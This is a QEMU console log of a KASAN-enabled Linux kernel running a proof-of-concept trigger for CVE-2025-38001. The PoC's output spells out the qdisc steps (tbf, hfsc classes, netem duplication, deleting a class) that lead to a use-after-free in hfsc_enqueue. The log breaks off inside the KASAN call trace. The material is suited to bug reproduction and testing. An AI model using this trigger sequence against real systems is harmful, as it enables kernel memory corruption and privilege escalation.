bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
c[?7l[2J[0mSeaBIOS (version 1.16.2-debian-1.16.2-1)


iPXE (http://ipxe.org) 00:03.0 CA00 PCI2.10 PnP PMM+7EFCEF00+7EF0EF00 CA00
Press Ctrl-B to configure iPXE (PCI 00:03.0)...                                                                               


Booting from ROM..c[?7l[2J[    0.000000] Linux version 6.15.0-rc7-00099-g67af4ec948e8-dirty (root@buildkitsandbox) (gcc (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Tue May  5 16:42:39 UTC 2026
[    0.000000] Command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.000000] BIOS-provided physical RAM map:
[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable
[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved
[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000007ffdffff] usable
[    0.000000] BIOS-e820: [mem 0x000000007ffe0000-0x000000007fffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000feffc000-0x00000000feffffff] reserved
[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved
[    0.000000] NX (Execute Disable) protection: active
[    0.000000] APIC: Static calls initialized
[    0.000000] SMBIOS 2.8 present.
[    0.000000] DMI: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
[    0.000000] DMI: Memory slots populated: 1/1
[    0.000000] Hypervisor detected: KVM
[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00
[    0.000000] kvm-clock: using sched offset of 304990149 cycles
[    0.000002] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns
[    0.000004] tsc: Detected 3187.200 MHz processor
[    0.000303] last_pfn = 0x7ffe0 max_arch_pfn = 0x400000000
[    0.000321] MTRR map: 4 entries (3 fixed + 1 variable; max 19), built from 8 variable MTRRs
[    0.000323] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  
[    0.002428] found SMP MP-table at [mem 0x000f5ba0-0x000f5baf]
[    0.002433] Using GB pages for direct mapping
[    0.002520] RAMDISK: [mem 0x7fe8f000-0x7ffdffff]
[    0.002524] ACPI: Early table checksum verification disabled
[    0.002526] ACPI: RSDP 0x00000000000F59D0 000014 (v00 BOCHS )
[    0.002529] ACPI: RSDT 0x000000007FFE1B33 000034 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002534] ACPI: FACP 0x000000007FFE19DF 000074 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002537] ACPI: DSDT 0x000000007FFE0040 00199F (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002540] ACPI: FACS 0x000000007FFE0000 000040
[    0.002541] ACPI: APIC 0x000000007FFE1A53 000080 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002543] ACPI: HPET 0x000000007FFE1AD3 000038 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002544] ACPI: WAET 0x000000007FFE1B0B 000028 (v01 BOCHS  BXPC     00000001 BXPC 00000001)
[    0.002546] ACPI: Reserving FACP table memory at [mem 0x7ffe19df-0x7ffe1a52]
[    0.002547] ACPI: Reserving DSDT table memory at [mem 0x7ffe0040-0x7ffe19de]
[    0.002547] ACPI: Reserving FACS table memory at [mem 0x7ffe0000-0x7ffe003f]
[    0.002548] ACPI: Reserving APIC table memory at [mem 0x7ffe1a53-0x7ffe1ad2]
[    0.002548] ACPI: Reserving HPET table memory at [mem 0x7ffe1ad3-0x7ffe1b0a]
[    0.002549] ACPI: Reserving WAET table memory at [mem 0x7ffe1b0b-0x7ffe1b32]
[    0.002727] No NUMA configuration found
[    0.002728] Faking a node at [mem 0x0000000000000000-0x000000007ffdffff]
[    0.002729] NODE_DATA(0) allocated [mem 0x7fe8b800-0x7fe8efff]
[    0.002736] Zone ranges:
[    0.002737]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]
[    0.002738]   DMA32    [mem 0x0000000001000000-0x000000007ffdffff]
[    0.002739]   Normal   empty
[    0.002739] Movable zone start for each node
[    0.002740] Early memory node ranges
[    0.002740]   node   0: [mem 0x0000000000001000-0x000000000009efff]
[    0.002741]   node   0: [mem 0x0000000000100000-0x000000007ffdffff]
[    0.002742] Initmem setup node 0 [mem 0x0000000000001000-0x000000007ffdffff]
[    0.003759] On node 0, zone DMA: 1 pages in unavailable ranges
[    0.003797] On node 0, zone DMA: 97 pages in unavailable ranges
[    0.030020] On node 0, zone DMA32: 32 pages in unavailable ranges
[    0.168896] kasan: KernelAddressSanitizer initialized
[    0.169090] ACPI: PM-Timer IO Port: 0x608
[    0.169101] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])
[    0.169129] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23
[    0.169131] ACPI: INT_SRC_OVR (bus 0 bus_irq 0 global_irq 2 dfl dfl)
[    0.169133] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)
[    0.169133] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)
[    0.169134] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)
[    0.169135] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)
[    0.169137] ACPI: Using ACPI (MADT) for SMP configuration information
[    0.169138] ACPI: HPET id: 0x8086a201 base: 0xfed00000
[    0.169140] TSC deadline timer available
[    0.169143] CPU topo: Max. logical packages:   1
[    0.169143] CPU topo: Max. logical dies:       1
[    0.169144] CPU topo: Max. dies per package:   1
[    0.169145] CPU topo: Max. threads per core:   1
[    0.169146] CPU topo: Num. cores per package:     2
[    0.169147] CPU topo: Num. threads per package:   2
[    0.169147] CPU topo: Allowing 2 present CPUs plus 0 hotplug CPUs
[    0.169160] kvm-guest: APIC: eoi() replaced with kvm_guest_apic_eoi_write()
[    0.169172] kvm-guest: KVM setup pv remote TLB flush
[    0.169174] kvm-guest: setup PV sched yield
[    0.169179] PM: hibernation: Registered nosave memory: [mem 0x00000000-0x00000fff]
[    0.169180] PM: hibernation: Registered nosave memory: [mem 0x0009f000-0x000fffff]
[    0.169182] [mem 0x80000000-0xfeffbfff] available for PCI devices
[    0.169183] Booting paravirtualized kernel on KVM
[    0.169184] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1910969940391419 ns
[    0.177589] setup_percpu: NR_CPUS:64 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1
[    0.179243] percpu: Embedded 63 pages/cpu s220760 r8192 d29096 u1048576
[    0.179270] Kernel command line: console=ttyS0 oops=panic nokaslr rdinit=/init
[    0.179308] random: crng init done
[    0.179309] printk: log buffer data + meta data: 262144 + 917504 = 1179648 bytes
[    0.179367] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.180501] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.180536] Fallback order for Node 0: 0 
[    0.180538] Built 1 zonelists, mobility grouping on.  Total pages: 524158
[    0.180539] Policy zone: DMA32
[    0.180540] mem auto-init: stack:all(zero), heap alloc:off, heap free:off
[    0.180541] stackdepot: allocating hash table via alloc_large_system_hash
[    0.180542] stackdepot hash table entries: 1048576 (order: 12, 16777216 bytes, linear)
[    0.210517] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
[    0.211486] Dynamic Preempt: voluntary
[    0.213100] rcu: Preemptible hierarchical RCU implementation.
[    0.213101] rcu: 	RCU event tracing is enabled.
[    0.213101] rcu: 	RCU restricting CPUs from NR_CPUS=64 to nr_cpu_ids=2.
[    0.213103] 	Trampoline variant of Tasks RCU enabled.
[    0.213103] 	Tracing variant of Tasks RCU enabled.
[    0.213104] rcu: RCU calculated value of scheduler-enlistment delay is 100 jiffies.
[    0.213105] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.213117] RCU Tasks: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.213119] RCU Tasks Trace: Setting shift to 1 and lim to 1 rcu_task_cb_adjust=1 rcu_task_cpu_ids=2.
[    0.221301] NR_IRQS: 4352, nr_irqs: 440, preallocated irqs: 16
[    0.221533] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.223718] Console: colour VGA+ 80x25
[    0.223747] printk: legacy console [ttyS0] enabled
[    0.261474] ACPI: Core revision 20240827
[    0.261808] clocksource: hpet: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604467 ns
[    0.262363] APIC: Switch to symmetric I/O mode setup
[    0.262742] x2apic enabled
[    0.263042] APIC: Switched APIC routing to: physical x2apic
[    0.263348] kvm-guest: APIC: send_IPI_mask() replaced with kvm_send_ipi_mask()
[    0.263753] kvm-guest: APIC: send_IPI_mask_allbutself() replaced with kvm_send_ipi_mask_allbutself()
[    0.264251] kvm-guest: setup PV IPIs
[    0.265193] ..TIMER: vector=0x30 apic1=0 pin1=2 apic2=-1 pin2=-1
[    0.265551] clocksource: tsc-early: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.266137] Calibrating delay loop (skipped) preset value.. 6374.40 BogoMIPS (lpj=3187200)
[    0.267210] x86/cpu: User Mode Instruction Prevention (UMIP) activated
[    0.267620] Last level iTLB entries: 4KB 0, 2MB 0, 4MB 0
[    0.268135] Last level dTLB entries: 4KB 0, 2MB 0, 4MB 0, 1GB 0
[    0.268467] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization
[    0.268938] Spectre V2 : Spectre BHI mitigation: SW BHB clearing on syscall and VM exit
[    0.269137] Spectre V2 : Mitigation: Enhanced / Automatic IBRS
[    0.269466] Spectre V2 : Spectre v2 / PBRSB-eIBRS: Retire a single CALL on VMEXIT
[    0.270137] Spectre V2 : mitigation: Enabling conditional Indirect Branch Prediction Barrier
[    0.270605] Speculative Store Bypass: Mitigation: Speculative Store Bypass disabled via prctl
[    0.271135] MMIO Stale Data: Unknown: No mitigations
[    0.271413] ITS: Mitigation: Aligned branch/return thunks
[    0.271728] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.272135] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
[    0.272495] x86/fpu: Supporting XSAVE feature 0x004: 'AVX registers'
[    0.272884] x86/fpu: Supporting XSAVE feature 0x200: 'Protection Keys User registers'
[    0.273136] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256
[    0.273492] x86/fpu: xstate_offset[9]:  832, xstate_sizes[9]:    8
[    0.273843] x86/fpu: Enabled xstate features 0x207, context size is 840 bytes, using 'compacted' format.
[    0.292451] Freeing SMP alternatives memory: 52K
[    0.292750] pid_max: default: 32768 minimum: 301
[    0.293060] LSM: initializing lsm=capability,selinux
[    0.293153] SELinux:  Initializing.
[    0.293504] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.294137] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.294981] smpboot: CPU0: Intel(R) Core(TM) i9-14900K (family: 0x6, model: 0xb7, stepping: 0x1)
[    0.295134] Performance Events: unsupported CPU family 6 model 183 no PMU driver, software events only.
[    0.295155] signal: max sigframe size: 3632
[    0.295423] rcu: Hierarchical SRCU implementation.
[    0.295699] rcu: 	Max phase no-delay instances is 400.
[    0.296048] Timer migration: 1 hierarchy levels; 8 children per group; 1 crossnode level
[    0.298058] smp: Bringing up secondary CPUs ...
[    0.298265] smpboot: x86: Booting SMP configuration:
[    0.298551] .... node  #0, CPUs:      #1
[    0.298615] smp: Brought up 1 node, 2 CPUs
[    0.299137] smpboot: Total of 2 processors activated (12748.80 BogoMIPS)
[    0.299652] Memory: 1670548K/2096632K available (51822K kernel code, 8748K rwdata, 11356K rodata, 6100K init, 1172K bss, 418456K reserved, 0K cma-reserved)
[    0.300263] devtmpfs: initialized
[    0.303157] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 1911260446275000 ns
[    0.303709] posixtimers hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.304139] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.304649] PM: RTC time: 16:45:45, date: 2026-05-05
[    0.305044] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.305340] audit: initializing netlink subsys (disabled)
[    0.305658] audit: type=2000 audit(1777999546.453:1): state=initialized audit_enabled=0 res=1
[    0.307001] thermal_sys: Registered thermal governor 'step_wise'
[    0.307016] cpuidle: using governor menu
[    0.307612] PCI: Using configuration type 1 for base access
[    0.307975] kprobes: kprobe jump-optimization is enabled. All kprobes are optimized if possible.
[    0.308179] HugeTLB: allocation took 0ms with hugepage_allocation_threads=1
[    0.308566] HugeTLB: registered 2.00 MiB page size, pre-allocated 0 pages
[    0.308957] HugeTLB: 28 KiB vmemmap can be freed for a 2.00 MiB page
[    0.309143] ACPI: Added _OSI(Module Device)
[    0.309143] ACPI: Added _OSI(Processor Device)
[    0.309393] ACPI: Added _OSI(3.0 _SCP Extensions)
[    0.309662] ACPI: Added _OSI(Processor Aggregator Device)
[    0.315932] ACPI: 1 ACPI AML tables successfully acquired and loaded
[    0.321826] ACPI: Interpreter enabled
[    0.322165] ACPI: PM: (supports S0 S3 S4 S5)
[    0.322416] ACPI: Using IOAPIC for interrupt routing
[    0.322731] PCI: Using host bridge windows from ACPI; if necessary, use "pci=nocrs" and report a bug
[    0.323136] PCI: Using E820 reservations for host bridge windows
[    0.323812] ACPI: Enabled 2 GPEs in block 00 to 0F
[    0.335960] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])
[    0.336146] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI HPX-Type3]
[    0.336590] acpi PNP0A03:00: _OSC: not requesting OS control; OS requires [ExtendedConfig ASPM ClockPM MSI]
[    0.337195] acpi PNP0A03:00: fail to add MMCONFIG information, can't access extended configuration space under this bridge
[    0.338009] PCI host bridge to bus 0000:00
[    0.338162] pci_bus 0000:00: root bus resource [io  0x0000-0x0cf7 window]
[    0.338583] pci_bus 0000:00: root bus resource [io  0x0d00-0xffff window]
[    0.338999] pci_bus 0000:00: root bus resource [mem 0x000a0000-0x000bffff window]
[    0.340139] pci_bus 0000:00: root bus resource [mem 0x80000000-0xfebfffff window]
[    0.340592] pci_bus 0000:00: root bus resource [mem 0x100000000-0x17fffffff window]
[    0.341064] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.341171] pci 0000:00:00.0: [8086:1237] type 00 class 0x060000 conventional PCI endpoint
[    0.349677] pci 0000:00:01.0: [8086:7000] type 00 class 0x060100 conventional PCI endpoint
[    0.354301] pci 0000:00:01.1: [8086:7010] type 00 class 0x010180 conventional PCI endpoint
[    0.355156] pci 0000:00:01.1: BAR 4 [io  0xc040-0xc04f]
[    0.355498] pci 0000:00:01.1: BAR 0 [io  0x01f0-0x01f7]: legacy IDE quirk
[    0.355913] pci 0000:00:01.1: BAR 1 [io  0x03f6]: legacy IDE quirk
[    0.357136] pci 0000:00:01.1: BAR 2 [io  0x0170-0x0177]: legacy IDE quirk
[    0.357551] pci 0000:00:01.1: BAR 3 [io  0x0376]: legacy IDE quirk
[    0.358070] pci 0000:00:01.3: [8086:7113] type 00 class 0x068000 conventional PCI endpoint
[    0.358328] pci 0000:00:01.3: quirk: [io  0x0600-0x063f] claimed by PIIX4 ACPI
[    0.358772] pci 0000:00:01.3: quirk: [io  0x0700-0x070f] claimed by PIIX4 SMB
[    0.359294] pci 0000:00:02.0: [1234:1111] type 00 class 0x030000 conventional PCI endpoint
[    0.360477] pci 0000:00:02.0: BAR 0 [mem 0xfd000000-0xfdffffff pref]
[    0.360976] pci 0000:00:02.0: BAR 2 [mem 0xfebf0000-0xfebf0fff]
[    0.361154] pci 0000:00:02.0: ROM [mem 0xfebe0000-0xfebeffff pref]
[    0.361650] pci 0000:00:02.0: Video device with shadowed ROM at [mem 0x000c0000-0x000dffff]
[    0.367274] pci 0000:00:03.0: [8086:100e] type 00 class 0x020000 conventional PCI endpoint
[    0.368362] pci 0000:00:03.0: BAR 0 [mem 0xfebc0000-0xfebdffff]
[    0.368732] pci 0000:00:03.0: BAR 1 [io  0xc000-0xc03f]
[    0.369072] pci 0000:00:03.0: ROM [mem 0xfeb80000-0xfebbffff pref]
[    0.374077] ACPI: PCI: Interrupt link LNKA configured for IRQ 10
[    0.375825] ACPI: PCI: Interrupt link LNKB configured for IRQ 10
[    0.376508] ACPI: PCI: Interrupt link LNKC configured for IRQ 11
[    0.377549] ACPI: PCI: Interrupt link LNKD configured for IRQ 11
[    0.378051] ACPI: PCI: Interrupt link LNKS configured for IRQ 9
[    0.379111] iommu: Default domain type: Translated
[    0.379136] iommu: DMA domain TLB invalidation policy: lazy mode
[    0.379667] SCSI subsystem initialized
[    0.380220] ACPI: bus type USB registered
[    0.381186] usbcore: registered new interface driver usbfs
[    0.381525] usbcore: registered new interface driver hub
[    0.381854] usbcore: registered new device driver usb
[    0.382174] pps_core: LinuxPPS API ver. 1 registered
[    0.382467] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.383004] PTP clock support registered
[    0.383194] Advanced Linux Sound Architecture Driver Initialized.
[    0.383898] NetLabel: Initializing
[    0.384136] NetLabel:  domain hash size = 128
[    0.384393] NetLabel:  protocols = UNLABELED CIPSOv4 CALIPSO
[    0.384755] NetLabel:  unlabeled traffic allowed by default
[    0.385175] PCI: Using ACPI for IRQ routing
[    0.385472] pci 0000:00:02.0: vgaarb: setting as boot VGA device
[    0.385495] pci 0000:00:02.0: vgaarb: bridge control possible
[    0.385829] pci 0000:00:02.0: vgaarb: VGA device added: decodes=io+mem,owns=io+mem,locks=none
[    0.386136] vgaarb: loaded
[    0.386355] hpet0: at MMIO 0xfed00000, IRQs 2, 8, 0
[    0.386641] hpet0: 3 comparators, 64-bit 100.000000 MHz counter
[    0.390172] clocksource: Switched to clocksource kvm-clock
[    0.391058] VFS: Disk quotas dquot_6.6.0
[    0.391271] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.391975] pnp: PnP ACPI init
[    0.393206] pnp: PnP ACPI: found 6 devices
[    0.400924] clocksource: acpi_pm: mask: 0xffffff max_cycles: 0xffffff, max_idle_ns: 2085701024 ns
[    0.401477] NET: Registered PF_INET protocol family
[    0.402324] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.403207] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.403727] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.404191] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.404665] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.405113] TCP: Hash tables configured (established 16384 bind 16384)
[    0.405518] UDP hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    0.405913] UDP-Lite hash table entries: 1024 (order: 4, 65536 bytes, linear)
[    0.406380] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.406888] RPC: Registered named UNIX socket transport module.
[    0.407236] RPC: Registered udp transport module.
[    0.407513] RPC: Registered tcp transport module.
[    0.407790] RPC: Registered tcp-with-tls transport module.
[    0.408110] RPC: Registered tcp NFSv4.1 backchannel transport module.
[    0.408835] pci_bus 0000:00: resource 4 [io  0x0000-0x0cf7 window]
[    0.409195] pci_bus 0000:00: resource 5 [io  0x0d00-0xffff window]
[    0.409551] pci_bus 0000:00: resource 6 [mem 0x000a0000-0x000bffff window]
[    0.409946] pci_bus 0000:00: resource 7 [mem 0x80000000-0xfebfffff window]
[    0.410341] pci_bus 0000:00: resource 8 [mem 0x100000000-0x17fffffff window]
[    0.410829] pci 0000:00:01.0: PIIX3: Enabling Passive Release
[    0.411162] pci 0000:00:00.0: Limiting direct PCI/PCI transfers
[    0.411533] PCI: CLS 0 bytes, default 64
[    0.411823] RAPL PMU: API unit is 2^-32 Joules, 0 fixed counters, 10737418240 ms ovfl timer
[    0.411937] Unpacking initramfs...
[    0.412315] clocksource: tsc: mask: 0xffffffffffffffff max_cycles: 0x2df10e7656b, max_idle_ns: 440795364873 ns
[    0.414770] Initialise system trusted keyrings
[    0.415088] workingset: timestamp_bits=56 max_order=19 bucket_order=0
[    0.415848] NFS: Registering the id_resolver key type
[    0.416152] Key type id_resolver registered
[    0.416397] Key type id_legacy registered
[    0.416691] 9p: Installing v9fs 9p2000 file system support
[    0.423373] Key type asymmetric registered
[    0.423656] Asymmetric key parser 'x509' registered
[    0.423968] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 251)
[    0.424410] io scheduler mq-deadline registered
[    0.424677] io scheduler kyber registered
[    0.425185] input: Power Button as /devices/LNXSYSTM:00/LNXPWRBN:00/input/input0
[    0.425716] ACPI: button: Power Button [PWRF]
[    0.426070] Freeing initrd memory: 1348K
[    0.426545] Serial: 8250/16550 driver, 4 ports, IRQ sharing enabled
[    0.427078] 00:04: ttyS0 at I/O 0x3f8 (irq = 4, base_baud = 115200) is a 16550A
[    0.428659] Non-volatile memory driver v1.3
[    0.428912] Linux agpgart interface v0.103
[    0.429253] ACPI: bus type drm_connector registered
[    0.433528] loop: module loaded
[    0.434777] scsi host0: ata_piix
[    0.435201] scsi host1: ata_piix
[    0.435490] ata1: PATA max MWDMA2 cmd 0x1f0 ctl 0x3f6 bmdma 0xc040 irq 14 lpm-pol 0
[    0.435938] ata2: PATA max MWDMA2 cmd 0x170 ctl 0x376 bmdma 0xc048 irq 15 lpm-pol 0
[    0.436937] e100: Intel(R) PRO/100 Network Driver
[    0.437215] e100: Copyright(c) 1999-2006 Intel Corporation
[    0.437553] e1000: Intel(R) PRO/1000 Network Driver
[    0.437839] e1000: Copyright (c) 1999-2006 Intel Corporation.
[    0.591823] ata2: found unknown device (class 0)
[    0.592536] ata2.00: ATAPI: QEMU DVD-ROM, 2.5+, max UDMA/100
[    0.594150] scsi 1:0:0:0: CD-ROM            QEMU     QEMU DVD-ROM     2.5+ PQ: 0 ANSI: 5
[    0.611043] sr 1:0:0:0: [sr0] scsi3-mmc drive: 4x/4x cd/rw xa/form2 tray
[    0.611441] cdrom: Uniform CD-ROM driver Revision: 3.20
[    0.622482] sr 1:0:0:0: Attached scsi generic sg0 type 5
[    0.758293] ACPI: \_SB_.LNKC: Enabled at IRQ 11
[    1.043050] e1000 0000:00:03.0 eth0: (PCI:33MHz:32-bit) 52:54:00:12:34:56
[    1.043461] e1000 0000:00:03.0 eth0: Intel(R) PRO/1000 Network Connection
[    1.043909] e1000e: Intel(R) PRO/1000 Network Driver
[    1.044207] e1000e: Copyright(c) 1999 - 2015 Intel Corporation.
[    1.044582] sky2: driver version 1.30
[    1.045147] usbcore: registered new interface driver usblp
[    1.045489] usbcore: registered new interface driver usb-storage
[    1.045897] i8042: PNP: PS/2 Controller [PNP0303:KBD,PNP0f13:MOU] at 0x60,0x64 irq 1,12
[    1.046827] serio: i8042 KBD port at 0x60,0x64 irq 1
[    1.047126] serio: i8042 AUX port at 0x60,0x64 irq 12
[    1.047785] input: AT Translated Set 2 keyboard as /devices/platform/i8042/serio0/input/input1
[    1.048393] rtc_cmos 00:05: RTC can wake from S4
[    1.049206] rtc_cmos 00:05: registered as rtc0
[    1.049532] rtc_cmos 00:05: alarms up to one day, y3k, 242 bytes nvram, hpet irqs
[    1.050972] device-mapper: ioctl: 4.49.0-ioctl (2025-01-17) initialised: dm-devel@lists.linux.dev
[    1.051494] intel_pstate: CPU model not supported
[    1.051805] hid: raw HID events driver (C) Jiri Kosina
[    1.052521] usbcore: registered new interface driver usbhid
[    1.052852] usbhid: USB HID core driver
[    1.053699] netem: version 1.3
[    1.053897] u32 classifier
[    1.054074]     input device check on
[    1.054298]     Actions configured
[    1.054757] Initializing XFRM netlink socket
[    1.055046] NET: Registered PF_INET6 protocol family
[    1.055791] Segment Routing with IPv6
[    1.056037] In-situ OAM (IOAM) with IPv6
[    1.056309] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.056899] NET: Registered PF_PACKET protocol family
[    1.057666] 9pnet: Installing 9P2000 support
[    1.057944] Key type dns_resolver registered
[    1.058431] IPI shorthand broadcast: enabled
[    1.069789] sched_clock: Marking stable (1028001013, 41595748)->(1072507159, -2910398)
[    1.070990] registered taskstats version 1
[    1.071281] Loading compiled-in X.509 certificates
[    1.080628] Demotion targets for Node 0: null
[    1.080992] PM:   Magic number: 10:302:792
[    1.081272] printk: legacy console [netcon0] enabled
[    1.081564] netconsole: network logging started
[    1.082271] cfg80211: Loading compiled-in X.509 certificates for regulatory database
[    1.083711] kworker/u8:1 (57) used greatest stack depth: 29432 bytes left
[    1.085862] Loaded X.509 cert 'sforshee: 00b28ddf47aef9cea7'
[    1.086329] Loaded X.509 cert 'wens: 61c038651aabdcf94bd0ac7ff06c7248db18c600'
[    1.086764] ALSA device list:
[    1.086957]   No soundcards found.
[    1.088002] Freeing unused kernel image (initmem) memory: 6100K
[    1.088291] platform regulatory.0: Direct firmware load for regulatory.db failed with error -2
[    1.088633] cfg80211: failed to load regulatory.db
[    1.088846] Write protecting the kernel read-only data: 65536k
[    1.089448] Freeing unused kernel image (text/rodata gap) memory: 1424K
[    1.089877] Freeing unused kernel image (rodata/data gap) memory: 932K
[    1.098542] x86/mm: Checked W+X mappings: passed, no W+X pages found.
[    1.098805] Run /init as init process
[    1.099512] mkdir (60) used greatest stack depth: 28896 bytes left
[    1.100042] mount (61) used greatest stack depth: 28216 bytes left
[    1.100999] mount (63) used greatest stack depth: 28200 bytes left
[    1.101398] mount (64) used greatest stack depth: 27960 bytes left

secb: rootfs ready
---- poc begin ----
poc: starting CVE-2025-38001 trigger
poc: userns ready (CAP_NET_ADMIN in new netns)
poc: lo up
[    1.108426] sch_tbf: burst 100 is lower than device lo mtu (65550) !
poc: tbf root installed (rate=1 B/s, burst=100)
poc: hfsc 2:0 installed under tbf
poc: hfsc classes 2:1, 2:2 and netem 3:0 (dup=100%) set up
poc: sending to clas[    1.109376] ==================================================================
s 2:1 to double-[    1.109710] BUG: KASAN: slab-use-after-free in init_ed+0x3f6/0x4d0
insert into eltr[    1.110017] Read of size 8 at addr ffff88800a6e3110 by task poc/67
ee
poc: deletin[    1.110319] 
g class 2:1 (freed but still in [    1.110447] CPU: 0 UID: 0 PID: 67 Comm: poc Not tainted 6.15.0-rc7-00099-g67af4ec948e8-dirty #1 PREEMPT(voluntary) 
eltree)
poc: se[    1.110449] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.16.2-debian-1.16.2-1 04/01/2014
nding to class 2[    1.110450] Call Trace:
:2 -> UAF on fre[    1.110451]  <TASK>
ed 2:1 el_node
[    1.110452]  dump_stack_lvl+0x53/0x70
[    1.110455]  print_report+0xce/0x670
[    1.110458]  ? init_ed+0x3f6/0x4d0
[    1.110460]  kasan_report+0xce/0x100
[    1.110461]  ? init_ed+0x3f6/0x4d0
[    1.110463]  init_ed+0x3f6/0x4d0
[    1.110465]  hfsc_enqueue+0xa26/0xe90
[    1.110467]  ? __pfx_hfsc_enqueue+0x10/0x10
[    1.110469]  tbf_enqueue+0x21a/0x7a0
[    1.110470]  ? _raw_spin_lock+0x7f/0xd0
[    1.110474]  dev_qdisc_enqueue+0x3e/0x140
[    1.110476]  __dev_queue_xmit+0xe12/0x3220
[    1.110478]  ? __alloc_skb+0x147/0x2d0
[    1.110480]  ? __pfx___alloc_skb+0x10/0x10
[    1.110481]  ? __pfx___dev_queue_xmit+0x10/0x10
[    1.110483]  ? __pfx_selinux_ip_postroute_compat+0x10/0x10
[    1.110485]  ? _copy_from_iter+0x212/0x1130
[    1.110489]  ? stack_trace_save+0x8e/0xc0
[    1.110492]  ? selinux_ip_postroute+0x3fa/0xaf0
[    1.110493]  ip_finish_output2+0x71f/0x19a0
[    1.110495]  ? __pfx_ip_finish_output2+0x10/0x10
[    1.110498]  __ip_finish_output.part.0+0x474/0x950
[    1.110499]  ? __pfx___ip_finish_output.part.0+0x10/0x10
[    1.110500]  ? nf_hook_slow+0xa2/0x1c0
[    1.110502]  ip_output+0x25b/0x5d0
[    1.110503]  ? __ip_local_out+0x310/0x400
[    1.110505]  ? __pfx_ip_output+0x10/0x10
[    1.110506]  ? __pfx_ip_finish_output+0x10/0x10
[    1.110507]  ? __pfx_ip_generic_getfrag+0x10/0x10
[    1.110509]  ip_send_skb+0x116/0x150
[    1.110510]  udp_send_skb+0x656/0x1300
[    1.110513]  udp_sendmsg+0x11f3/0x1e40
[    1.110515]  ? __pfx_ip_generic_getfrag+0x10/0x10
[    1.110517]  ? __pfx_udp_sendmsg+0x10/0x10
[    1.110518]  ? sk_setsockopt+0xe70/0x2bc0
[    1.110520]  ? inet_autobind+0x111/0x160
[    1.110523]  ? inet_send_prepare+0x209/0x290
[    1.110524]  __sys_sendto+0x35d/0x420
[    1.110527]  ? __pfx___sys_sendto+0x10/0x10
[    1.110529]  ? alloc_fd+0x336/0x5b0
[    1.110532]  ? __sys_setsockopt+0xdd/0x130
[    1.110534]  __x64_sys_sendto+0xdb/0x1b0
[    1.110536]  ? clear_bhb_loop+0x40/0x90
[    1.110538]  ? clear_bhb_loop+0x40/0x90
